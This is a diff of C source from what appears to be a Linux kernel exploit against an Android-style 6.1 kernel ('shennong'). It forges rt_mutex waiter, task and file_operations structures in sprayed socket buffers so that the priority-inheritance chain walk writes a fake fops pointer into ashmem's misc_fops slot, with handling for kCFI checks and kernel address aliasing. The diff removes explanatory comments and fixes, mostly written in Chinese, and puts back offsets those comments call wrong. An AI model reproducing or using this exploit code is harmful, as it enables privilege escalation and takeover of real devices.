@@ -175,18 +175,6 @@ long sched_setattr_tid(int tid, int nice_value) {
   return syscall(SYS_sched_setattr, tid, &attr, 0);
 }
 
-/* RT-variant: set SCHED_FIFO with given priority (1..99).
- * Used by slide consumer experiment to test whether a real RT priority
- * change is what triggers rt_mutex_adjust_prio_chain on shennong 6.1. */
-long sched_setattr_tid_rt(int tid, int rt_priority) {
-  struct local_sched_attr attr;
-  memset(&attr, 0, sizeof(attr));
-  attr.size = sizeof(attr);
-  attr.sched_policy = SCHED_FIFO;
-  attr.sched_priority = rt_priority;
-  return syscall(SYS_sched_setattr, tid, &attr, 0);
-}
-
 int try_cache_ashmem_path(const char *path) {
   int fd = open(path, O_RDWR | O_CLOEXEC);
   if (fd < 0) {
@@ -266,23 +254,11 @@ int has_zero_byte(uintptr_t value) {
 uintptr_t p0_data_alias(uintptr_t image_addr) {
   uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
   uintptr_t phys = P0_KERNEL_PHYS_LOAD + off;
-  /* Linear-map alias of the symbol's TRUE physical page. The old
-   * `(phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET` assumed the kernel image is
-   * loaded at P0_PHYS_OFFSET (0x80000000); on shennong it is loaded at
-   * P0_KERNEL_PHYS_LOAD (0xa8000000), so that formula landed 128MB below
-   * the real page and the W1 write (via data_addr) never reached the page
-   * the kernel reads via its canonical VA -> step=4 on every attempt. */
-  return P0_PAGE_OFFSET + phys;
+  return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
 }
 
 uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
-  /* 必须是 p0_data_alias 的严格逆运算:
-   *   data_alias = P0_PAGE_OFFSET + (P0_KERNEL_PHYS_LOAD + (image - KIMAGE_TEXT_BASE))
-   *   => image = KIMAGE_TEXT_BASE + (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_LOAD
-   * 旧写法用 P0_KERNEL_PHYS_DELTA (= PHYS_LOAD - PHYS_OFFSET = 0x28000000) 会少
-   * 减 P0_PHYS_OFFSET(0x80000000), 逆算出的 image 偏移错 128MB, 经此路径的
-   * slide_canon_addr 还原地址也会错位。 */
-  return (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_LOAD;
+  return (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_DELTA;
 }
 
 uintptr_t data_addr(uintptr_t image_addr) {
@@ -318,12 +294,8 @@ void put32(unsigned char *p, size_t off, uint32_t value) {
 
 void put_fake_fops_table(unsigned char *p, size_t off) {
   put64(p, off + FOPS_OWNER_OFF, 0);
-  /* CFI 防伪: llseek 槽必须指向真实内核函数,其入口前 4 字节自带正确的
-   * kCFI 类型哈希(#e61887de)。原先填 fake_w0+FAKE_WAITER_PI_TREE_ENTRY_OFF
-   * (喷页假地址),前 4 字节是垃圾 -> 内核走 f_op->llseek 时 kCFI 比对失败
-   * 直接 panic,卡在第 2 关。改成真实 noop_llseek 后,假钥匙牌与该槽
-   * 标记同构;后续 repair_fake_fops_llseek 写回同一值,语义不变。 */
-  put64(p, off + FOPS_LLSEEK_OFF, text_addr(NOOP_LLSEEK));
+  put64(p, off + FOPS_LLSEEK_OFF,
+        fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
   put64(p, off + FOPS_READ_OFF, 0);
   put64(p, off + FOPS_WRITE_OFF, 0);
   put64(p, off + FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER));
@@ -488,44 +460,24 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   fake_w0 = payload_base + W0_OFF;
   fake_task = payload_base + FAKE_TASK_OFF;
   fake_fops = payload_base + FOPS_TABLE_OFF;
-  int deep_walk = (payload_mode == PAGE_PAYLOAD_FOPS);
-  uintptr_t write_pc = fake_fops;
-  uintptr_t write_right = 0;
-  uintptr_t write_left = 0;
-  uint64_t waiter_task = text_addr(INIT_TASK);
-  uint64_t task_group = text_addr(ROOT_TASK_GROUP);
-  uint64_t pi_top_task = text_addr(INIT_TASK);
-  if (deep_walk) {
-    /* 第 2 关 FOPS(W1 写路线): 严格对齐已验证上游(Poc-Analysis 真机验证)。
-     * p0_data_alias 修正后 data_addr 与 canon_addr 已指向同一物理页, 故
-     * W1 写目标统一用 data_addr(ASHMEM_MISC_FOPS), 与 try_cfi_stage 的读
-     * 同族, 不再有"写经 data_addr、读经 canon_addr"的错位。
-     * waiter_task / task_group / pi_top_task 必须用真实内核对象
-     * (INIT_TASK / ROOT_TASK_GROUP): 之前误用页内 fake_task, 会让
-     * rt_mutex_setprio 走 __task_rq_lock(fake_task) 直接 panic, 或使 PI
-     * 链 walk 不进入 dequeue/W1, 假 fops 指针写不进 misc_fops -> step=4。 */
+  if (payload_mode == PAGE_PAYLOAD_FOPS) {
     fake_parent = fake_fops;
-    fake_right = 0;
+    fake_right = data_addr(ASHMEM_MISC_FOPS);
     fake_left = 0;
     binwrite_target = payload_base + SCRATCH_OFF;
-    write_pc = fake_fops;
-    write_right = 0;
-    write_left = canon_addr(ASHMEM_MISC_FOPS);
-    waiter_task = text_addr(INIT_TASK);
-    task_group = text_addr(ROOT_TASK_GROUP);
-    pi_top_task = text_addr(INIT_TASK);
   } else {
     fake_parent = data_addr(ASHMEM_MISC_FOPS) - 8;
     fake_right = fake_fops;
     fake_left = payload_base + LEFT_OFF;
     binwrite_target = payload_base + FOPS_OFF + 0x700;
-    write_pc = fake_fops;
-    write_right = data_addr(ASHMEM_MISC_FOPS);
-    write_left = 0;
-    waiter_task = text_addr(INIT_TASK);
-    task_group = text_addr(ROOT_TASK_GROUP);
-    pi_top_task = text_addr(INIT_TASK);
   }
+
+  uintptr_t write_pc = fake_fops;
+  uintptr_t write_right = data_addr(ASHMEM_MISC_FOPS);
+  uintptr_t write_left = 0;
+  uint64_t waiter_task = text_addr(INIT_TASK);
+  uint64_t task_group = text_addr(ROOT_TASK_GROUP);
+  uint64_t pi_top_task = text_addr(INIT_TASK);
   if (payload_mode == PAGE_PAYLOAD_SLIDE) {
     write_pc = SLIDE_LOGGERS_0_1;
     write_right = 0;
@@ -540,57 +492,43 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
 
     put32(p, LOCK_OFF + 0x00, 0);
     if (payload_mode == PAGE_PAYLOAD_SLIDE) {
-      /* slide 路径: owner=0, walk 走"lock is free"分支。
-       * slide 的 W1 写通过另一条路径触发(tree_entry 侧), 与 owner 无关。 */
       put64(p, LOCK_OFF + 0x08, 0);
       put64(p, LOCK_OFF + 0x10, 0);
       put64(p, LOCK_OFF + 0x18, 0);
     } else {
-      /* FOPS 路径: owner 必须非空且指向一个合法 task, 否则 PI 链 walk
-       * 走 "lock has no owner" 快速退出, rb_erase 永不执行,
-       * W1 写不触发 -> 全 24 次 step=4 且无 panic。
-       * owner = fake_task | 1 (bit0=1 表示 RT-mutex 持有),
-       * 配合 fake_task->pi_waiters 指向 fake_w0->pi_tree_entry,
-       * walk 走到 dequeue 分支时调用 rb_erase(pi_tree_entry),
-       * 触发 W1 写把 fake_fops 写入 misc_fops 槽。 */
-      put64(p, LOCK_OFF + 0x08, fake_task | 1);
-      put64(p, LOCK_OFF + 0x10, 0);
-      put64(p, LOCK_OFF + 0x18, 0);
+      put64(p, LOCK_OFF + 0x08, fake_w0);
+      put64(p, LOCK_OFF + 0x10, fake_w0);
+      put64(p, LOCK_OFF + 0x18, fake_task | 1);
     }
 
-    /* 6.1 legacy rt_mutex_waiter layout (BTF verified on shennong 6.1.138):
-     *   0x00 tree_entry (rb_node: pc/right/left)
-     *   0x18 pi_tree_entry (rb_node: pc/right/left)
-     *   0x30 task (ptr)
-     *   0x38 lock (ptr)
-     *   0x40 wake_state (u32)  0x44 prio (int)
-     *   0x48 deadline (u64)    0x50 ww_ctx (ptr)
-     * The 6.4+ FAKE_WAITER_* macros (0x28/0x50/0x58...) are WRONG for 6.1. */
-    put64(p, W0_OFF + 0x00, 1);                  /* tree_entry.pc */
-    put64(p, W0_OFF + 0x08, 0);                  /* tree_entry.right */
-    put64(p, W0_OFF + 0x10, 0);                  /* tree_entry.left */
-    put64(p, W0_OFF + 0x18, write_pc);           /* pi_tree_entry.pc */
-    put64(p, W0_OFF + 0x20, write_right);        /* pi_tree_entry.right */
-    put64(p, W0_OFF + 0x28, write_left);         /* pi_tree_entry.left */
-    put64(p, W0_OFF + 0x30, waiter_task);        /* task */
-    put64(p, W0_OFF + 0x38, fake_lock);          /* lock */
-    put32(p, W0_OFF + 0x40, 0);                  /* wake_state */
-    put32(p, W0_OFF + 0x44, FAKE_WAITER_PRIO);   /* prio */
-    put64(p, W0_OFF + 0x48, 0);                  /* deadline */
-    put64(p, W0_OFF + 0x50, 0);                  /* ww_ctx */
+    put64(p, W0_OFF + 0x00, 1);
+    put64(p, W0_OFF + 0x08, 0);
+    put64(p, W0_OFF + 0x10, 0);
+    put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
+    put64(p, W0_OFF + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
+    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
+    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
+    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
+    put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
+    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
+    put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
+    put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
+    put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
+    put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);
 
     put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
     put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
     put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
     put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
-    /* 第 2 关 FOPS 路径: owner = fake_task|1, waiter 必须在 owner 的
-     * pi_waiters 树中, 否则 PI 链 walk 走到 owner 时找不到 waiter,
-     * rb_erase(pi_tree_entry) 永不执行 -> W1 写不触发 -> step=4。
-     * 与 slide 路径一致: pi_waiters 指向 fake_w0+0x18 (6.1 pi_tree_entry)。 */
-    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
-          fake_w0 + 0x18);
-    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08,
-          fake_w0 + 0x18);
+    if (payload_mode == PAGE_PAYLOAD_FOPS) {
+      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
+      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
+    } else {
+      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
+            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
+      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08,
+            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
+    }
     put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, task_group);
     put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
     put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
@@ -707,7 +645,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   struct iovec iov;
   memset(&iov, 0, sizeof(iov));
   iov.iov_base = skb_buf;
-  iov.iov_len = SKB_RECLAIM_SIZE; /* 0x8e80: matches SKB_DATA_DELTA=-0xe80 layout; SKB_SEND_SIZE(0x10000) misplaces fake_lock */
+  iov.iov_len = SKB_SEND_SIZE;
 
   struct msghdr msg;
   memset(&msg, 0, sizeof(msg));
